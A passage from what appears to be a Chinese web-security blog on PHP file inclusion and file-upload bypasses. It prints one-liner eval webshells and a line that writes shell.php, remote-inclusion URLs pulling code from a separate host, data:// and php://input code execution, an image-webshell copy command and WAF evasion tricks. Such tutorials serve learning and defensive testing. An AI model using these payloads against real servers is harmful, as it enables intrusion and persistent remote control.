class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</span><br></pre></td></tr></table></figure><h3 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h3><p>利用条件：<strong>session的存储位置可以获取</strong></p><ol><li>通过phpinfo的信息可以获取到session的存储位置。<br>通过phpinfo的信息，获取到session.save_path为<code>/var/lib/php/session</code>：</li></ol><p>获取到session的存储位置</p><p><img src="/2019/09/20/file-contant-leak/1535366976_5b83d740d5e48.png"></p><ol start="2"><li>通过猜测默认的session存放位置进行尝试。<br>如linux下默认存储在<code>/var/lib/php/session</code>目录下：</li></ol><p><img src="/2019/09/20/file-contant-leak/1535366988_5b83d74c81ff5.png"></p><p><strong>session中的内容可以被控制，传入恶意代码</strong>。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$ctfs&#x3D;$_GET[&#39;ctfs&#39;];</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;username&quot;]&#x3D;$ctfs;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>漏洞分析:</strong></p><p>此php会将获取到的GET型ctfs变量的值存入到session中。</p><p>当访问<code>http://www.ctfs-wiki/session.php?ctfs=ctfs</code> 后，会在<code>/var/lib/php/session</code>目录下存储session的值。</p><p>session的文件名为<code>sess_+sessionid</code>，sessionid可以通过开发者模式获取。</p><p><img src="/2019/09/20/file-contant-leak/1535366999_5b83d757ab229.png"></p><p>所以session的文件名为<code>sess_akp79gfiedh13ho11i6f3sm6s6</code>。</p><p>到服务器的<code>/var/lib/php/session</code>目录下查看果然存在此文件，内容为：</p><pre><code>username|s:4:&quot;ctfs&quot;;[root@c21336db44d2 session]# cat sess_akp79gfiedh13ho11i6f3sm6s6username|s:4:&quot;ctfs&quot;</code></pre><p><strong>漏洞利用</strong></p><p>通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。</p><p>当访问<code>http://www.ctfs-wiki/session.php?ctfs=&lt;?php phpinfo();?&gt;</code>后，会在<code>/var/lib/php/session</code>目录下存储session的值</p><pre><code>[root@6da845537b27 session]# cat sess_83317220159fc31cd7023422f64bea1ausername|s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;</code></pre><p>攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。</p><h3 id="有限制本地文件包含漏洞绕过"><a href="#有限制本地文件包含漏洞绕过" class="headerlink" title="有限制本地文件包含漏洞绕过"></a>有限制本地文件包含漏洞绕过</h3><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p><strong>条件：</strong><code>magic_quotes_gpc = Off php版本&lt;5.3.4</code></p><p><strong>测试代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><pre><code>http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00</code></pre><p><img src="/2019/09/20/file-contant-leak/1535362913_5b83c7614d63c.png"></p><h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><p><strong>条件：</strong>windows OS，点号需要长于256；linux OS 长于4096</p><pre><code>Windows下目录最大长度为256字节，超出的部分会被丢弃；Linux下目录最大长度为4096字节，超出的部分会被丢弃。</code></pre><p><strong>测试代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>EXP:</strong></p><pre><code>http://www.ctfs-wiki.com/FI/FI.php?filename=test.txtcode></pre><p><img src="/2019/09/20/file-contant-leak/1535362924_5b83c76c8b50a.png"></p><h4 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h4><p><code>条件：</code>windows OS，点号需要长于256</p><pre><code>测试代码：</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>EXP:</strong></p><pre><code>http://www.ctfs-wiki.com/FI/FI.php？filename=test.txtcode></pre><p><img src="/2019/09/20/file-contant-leak/1535361836_5b83c32c4668a.png"></p><h2 id="远程包含RFI-Remote-File-Inclusion"><a href="#远程包含RFI-Remote-File-Inclusion" class="headerlink" title="远程包含RFI(Remote File Inclusion)"></a>远程包含RFI(Remote File Inclusion)</h2><p>PHP的配置文件<code>allow_url_fopen</code>和<code>allow_url_include</code>设置为ON，<code>include/require</code>等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p><pre><code>allow_url_fopen = On（是否允许打开远程文件，PHP&lt;5.2默认打开，）allow_url_include = On（是否允许include/require远程文件，默认关闭）</code></pre><h3 id="无限制远程文件包含漏洞"><a href="#无限制远程文件包含漏洞" class="headerlink" title="无限制远程文件包含漏洞"></a>无限制远程文件包含漏洞</h3><p><strong>测试代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过远程文件包含漏洞，包含php.txt可以解析。</p><pre><code>http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt</code></pre><p><strong>测试结果：</strong><br><img src="/2019/09/20/file-contant-leak/1535361964_5b83c3aceeb21.png"></p><h3 id="有限制远程文件包含漏洞绕过"><a href="#有限制远程文件包含漏洞绕过" class="headerlink" title="有限制远程文件包含漏洞绕过"></a>有限制远程文件包含漏洞绕过</h3><p><strong>测试代码：</strong></p><pre><code>&lt;?php include($_GET[&#39;filename&#39;] . &quot;.html&quot;); ?&gt;</code></pre><p>代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。</p><p><img src="/2019/09/20/file-contant-leak/1535362030_5b83c3ee6c99b.png"></p><h4 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h4><pre><code>http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?</code></pre><p><img src="/2019/09/20/file-contant-leak/1535362020_5b83c3e4ef0d3.png"></p><h4 id="号绕过"><a href="#号绕过" class="headerlink" title="#号绕过"></a>#号绕过</h4><pre><code>http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23</code></pre><p><img src="/2019/09/20/file-contant-leak/1535362014_5b83c3de83a8c.png"></p><p>还有哪些可以绕过？用burp跑一遍发现空格也可以绕过：</p><p><img src="/2019/09/20/file-contant-leak/1535362006_5b83c3d6c0463.png"></p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 <code>fopen()</code>、 <code>copy()</code>、 <code>file_exists()</code> 和 <code>filesize()</code> 的文件系统函数。 除了这些封装协议，还能通过 <code>stream_wrapper_register()</code>来注册自定义的封装协议。</p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p><img src="/2019/09/20/file-contant-leak/1535362079_5b83c41fbe910.png"></p><h3 id="php-输入输出流"><a href="#php-输入输出流" class="headerlink" title="php:// 输入输出流"></a>php:// 输入输出流</h3><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><h3 id="php-filter（本地磁盘文件进行读取）"><a href="#php-filter（本地磁盘文件进行读取）" class="headerlink" title="php://filter（本地磁盘文件进行读取）"></a>php://filter（本地磁盘文件进行读取）</h3><p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p><p><strong>用法：</strong></p><pre><code>?filename=php://filter/convert.base64-encode/resource=xxx.php ?filename=php://filter/read=convert.base64-encode/resource=xxx.php 一样。</code></pre><p><strong>条件：</strong>只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p><p><img src="/2019/09/20/file-contant-leak/1535362099_5b83c4338ee40.png"></p><p><strong>测试代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input是无效的。</p><p><strong>用法：</strong></p><pre><code>?file=php://input 数据利用POST传过去。</code></pre><h3 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h3><p>碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p><p><strong>测试代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><img src="/2019/09/20/file-contant-leak/1535362131_5b83c453589ad.png"></p><h3 id="php-input（写入木马）"><a href="#php-input（写入木马）" class="headerlink" title="php://input（写入木马）"></a>php://input（写入木马）</h3><p><strong>测试代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>条件：</strong>php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。</p><p>如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。</p><pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p><img src="/2019/09/20/file-contant-leak/1535362139_5b83c45b1a703.png"></p><p><strong>测试结果：</strong></p><p><img src="/2019/09/20/file-contant-leak/1535362160_5b83c470ae2c9.png"></p><p>如果不开启allow_url_include会报错：</p><p><img src="/2019/09/20/file-contant-leak/1535362176_5b83c48090fd4.png"></p><h3 id="php-input（命令执行）"><a href="#php-input（命令执行）" class="headerlink" title="php://input（命令执行）"></a>php://input（命令执行）</h3><p><strong>测试代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>条件：</strong>php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p><p><img src="/2019/09/20/file-contant-leak/1535362228_5b83c4b420691.png"></p><p>如果不开启allow_url_include会报错：</p><p><img src="/2019/09/20/file-contant-leak/1535362242_5b83c4c2bbbc9.png"></p><h3 id="file-伪协议-（读取文件内容）"><a href="#file-伪协议-（读取文件内容）" class="headerlink" title="file://伪协议 （读取文件内容）"></a>file://伪协议 （读取文件内容）</h3><p>通过file协议可以访问本地文件系统，读取到文件的内容</p><p><strong>测试代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/09/20/file-contant-leak/1535362266_5b83c4daaa35c.png"></p><h3 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h3><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；</p><pre><code>data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4data://（读取文件）</code></pre><p>和php伪协议的input类似，碰到file_get_contents()来用；</p><pre><code>&lt;?php // 打印 “I love PHP” echo file_get_contents(‘data://textplain;base64,SSBsb3ZlIFBIUAo=’); ?&gt;注意：&lt;span style=&quot;color: rgb(121, 121, 121);&quot;&gt;&lt;?php phpinfo();,这类执行代码最后没有?&gt;&lt;/span&gt;闭合;</code></pre><p>如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/09/20/file-contant-leak/1535362287_5b83c4efe99a7.png"></p><h3 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h3><p>这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。</p><p><strong>用法：</strong></p><pre><code>?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </code></pre><p><strong>测试代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/09/20/file-contant-leak/1535362303_5b83c4ff6a90e.png"></p><h3 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h3><p>zip伪协议和phar协议类似，但是用法不一样。</p><p><strong>用法：</strong></p><pre><code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。测试代码：</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/09/20/file-contant-leak/1535362318_5b83c50e8872e.png"></p><h2 id="文件包含的一些骚操作"><a href="#文件包含的一些骚操作" class="headerlink" title="文件包含的一些骚操作"></a>文件包含的一些骚操作</h2><h3 id="包含一些敏感文件"><a href="#包含一些敏感文件" class="headerlink" title="包含一些敏感文件"></a>包含一些敏感文件</h3><p><code>/proc/self/environ</code>文件：</p><p>向User-Agent头中注入PHP代码，包含成功就能得到shell</p><p>这个 self 不要以为就是 self 文件夹，实际上子目录/proc/self本身就是当前运行进程 PID</p><h3 id="贪婪包含"><a href="#贪婪包含" class="headerlink" title="贪婪包含"></a>贪婪包含</h3><p>一个payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;..&#x2F;flag.php|jpg</span><br></pre></td></tr></table></figure><h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h3><p><em>利用条件：</em></p><p>1、php 版本大于等于 php5.2</p><p>2、allow_url_fopen = On</p><p>3、allow_url_include = On</p><p>利用 data:// 伪协议进行代码执行的思路原理和 php:// 是类似的，都是利用了 PHP 中的流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">?file&#x3D;data:text&#x2F;plain;base64,base64编码的payload</span><br><span class="line">index.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p>加号 + 的 url 编码为 %2b，<code>PD9waHAgcGhwaW5mbygpOz8+</code> 的 base64 解码为：<code>&lt;?php phpinfo();?&gt;</code></p><h3 id="路径长度截断-1"><a href="#路径长度截断-1" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><p>这个要求php版本&lt; 5.3.10</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;../flag.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $filename=<span class="string">&#x27;pages/&#x27;</span>.(<span class="keyword">isset</span>($_GET[<span class="string">&quot;file&quot;</span>])?$_GET[<span class="string">&quot;file&quot;</span>]:<span class="string">&quot;welcome.txt&quot;</span>).<span class="string">&#x27;.html&#x27;</span>; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span> $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag 文件放在上层目录 这时我们可以使用字符 <code>./.</code> 和 <code>./</code> 来进行绕过，因为文件路径有长度限制</p><p><code>windows 259 个 bytes</code></p><p><code>linux 4096 个 bytes</code></p><p>参考：<br><a href="https://www.freebuf.com/articles/web/182280.html">https://www.freebuf.com/articles/web/182280.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传及其利用方式</title>
      <link href="2019/09/10/file-upload-leak/"/>
      <url>2019/09/10/file-upload-leak/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了文件上传漏洞及一些常见的利用方式，包括一些简单的绕过方式，一些常见的网站容器解析漏洞，以及图片马的制作和使用等等！</p><a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>文件上传漏洞是指对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</p><h2 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h2><h3 id="本地js检测"><a href="#本地js检测" class="headerlink" title="本地js检测"></a>本地js检测</h3><p>在上传时，数据还未发送过去，便发出警告</p><p><strong>绕过方法：</strong></p><ol><li>先将上传的文件改为可以上传的扩展名，上传时使用Burpsuite拦截数据包，将木马的扩展名改为原来的php,即可绕过客户端的验证</li><li>F12修改js代码</li></ol><h2 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h2><h3 id="MIME类型检测"><a href="#MIME类型检测" class="headerlink" title="MIME类型检测"></a>MIME类型检测</h3><p>MIME类型是什么？</p><p>在把输出结果传送到浏览器上的时候，浏览器必须启动应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。<br>在HTTP中，MIME类型被定义在Content-Type header中。</p><p>常见的MIME类型：</p><pre><code>.html          text/html .txt          text/plain .gif          image/gif .jpg          image/jpeg   .png          image/png  </code></pre><p><strong>绕过方法：</strong></p><p>通过burpsuite来修改文件的类型(Content-Type)进行过滤即可</p><h3 id="文件内容头检测"><a href="#文件内容头检测" class="headerlink" title="文件内容头检测"></a>文件内容头检测</h3><p>通过检测文件头内容判断上传文件的合法性</p><p><img src="/2019/09/10/file-upload-leak/20190924145404.png"></p><p><strong>绕过方法：</strong></p><p>在恶意脚本前加上允许上传文件的头标识(比如GIF89a，会解析成gif文件)</p><h3 id="黑名单与白名单"><a href="#黑名单与白名单" class="headerlink" title="黑名单与白名单"></a>黑名单与白名单</h3><p>通过判断后缀名来确定上传文件的合法性</p><p><strong>黑名单绕过方法：</strong></p><ol><li>大小写绕过，例如Php、PhP</li><li>利用黑名单中没有的，但是又能够被解析的后缀名，例如php、 php3、 php4、php5、php7、pht、phtml、phps</li><li>配合解析利用方法，将上传的文件当作php代码执行</li><li>使用00截断(基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候)<br><img src="/2019/09/10/file-upload-leak/20190924142619.png"></li><li>超长文件名截断上传(windows 258byte | linux 4096byte)<br>白名单绕过方法不太好绕过，一般都是配合解析漏洞</li></ol><h2 id="waf绕过姿势"><a href="#waf绕过姿势" class="headerlink" title="waf绕过姿势"></a>waf绕过姿势</h2><h3 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h3><p><strong>情景：</strong></p><p>文件上传后，检测是否合法，不合法就删除</p><p><strong>利用方式：</strong></p><p>在删除前访问到上传的文件</p><pre><code>&lt;?php $file = &#39;web.php&#39;; $shell = &#39;&lt;?php eval($_POST[&quot;key&quot;])?&gt;&#39;; file_put_contents($file,$shell); ?&gt;</code></pre><p>用bp同时上传和访问，虽然上传的文件被删除了，但可以通过访问web.php</p><h3 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h3><p>在一个文件上传的地方，右键审查元素，首先修改action为完整路径，然后复制粘贴上传浏览文件（&lt;input ……），这样就会出现两个上传框，第一个上传正常文件，第二个选择一句话木马，然后提交。</p><h3 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h3><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p><p><img src="/2019/09/10/file-upload-leak/12315544664.png"></p><p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p><p><img src="/2019/09/10/file-upload-leak/2654984841.png"></p><h3 id="filename"><a href="#filename" class="headerlink" title="filename"></a>filename</h3><p>针对早期版本安全狗，可以多加一个filename</p><p><img src="/2019/09/10/file-upload-leak/3.png"></p><p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：</p><p><img src="/2019/09/10/file-upload-leak/13.png"></p><h3 id="POST-GET"><a href="#POST-GET" class="headerlink" title="POST/GET"></a>POST/GET</h3><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p><h3 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h3><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。</p><p><img src="/2019/09/10/file-upload-leak/11.png"></p><h3 id="特殊的长文件名绕过"><a href="#特殊的长文件名绕过" class="headerlink" title="特殊的长文件名绕过"></a>特殊的长文件名绕过</h3><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：</p><pre><code>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</code></pre><h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h2><p>将图片和一句话在cmd下合成后，以php脚本执行时合成的一句话也会被执行</p><p>当一句话被执行时，浏览器访问时看不到一句话代码</p><p><strong>制作</strong><br>在cmd中输入</p><pre><code>copy a.jpg/b+a.php shell.jpg</code></pre><p><strong>利用</strong></p><ol><li>配合文件包含漏洞</li><li>配合网站容器解析漏洞</li></ol><h2 id="常见网站容器解析漏洞"><a href="#常见网站容器解析漏洞" class="headerlink" title="常见网站容器解析漏洞"></a>常见网站容器解析漏洞</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><h4 id="多后缀名"><a href="#多后缀名" class="headerlink" title="多后缀名"></a>多后缀名</h4><p>Apache对于文件名的解析是从后往前解析的，直到遇见一个Apache认识的文件类型为止</p><p>如：</p><pre><code>hello.php.rar.rar.rar</code></pre><p>Apache不认识.rar这个文件类型，会一直遍历到.php</p><p>在phpstudy网站目录存放一张a.jpg图片，将其改名为a.jpg.abc，再用浏览器去访问这张图片，发现被成功解析为图片：</p><p>那么现在在网站目录存放一个ma.php文件，里面内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#39;good&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>再将其改名为ma.php.abc，访问这个文件：</p><p>发现其并没有被解析，而是直接将里面的内容显示了出来，这是因为Apache本身并不懂php，而是将这个文件交给php解释器，php解释器和Apache有着不同的解析规则；</p><p>在<code>phpStudy\PHPTutorial\Apache\conf\extra</code>找到<code>httpd-php.conf</code>这个配置文件，打开可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.php$&quot;&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>我们可以知道，只有当文件名后缀为.php时，文件才能被当做php执行，那么现在将其改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.php\.&quot;&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>重启phpstudy，可以看到ma.php.abc已经可以被解析了：</p><h4 id="罕见后缀"><a href="#罕见后缀" class="headerlink" title="罕见后缀"></a>罕见后缀</h4><p>在某些情况下，不只是php，就连phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀</p><h4 id="妙用-HTACCESS"><a href="#妙用-HTACCESS" class="headerlink" 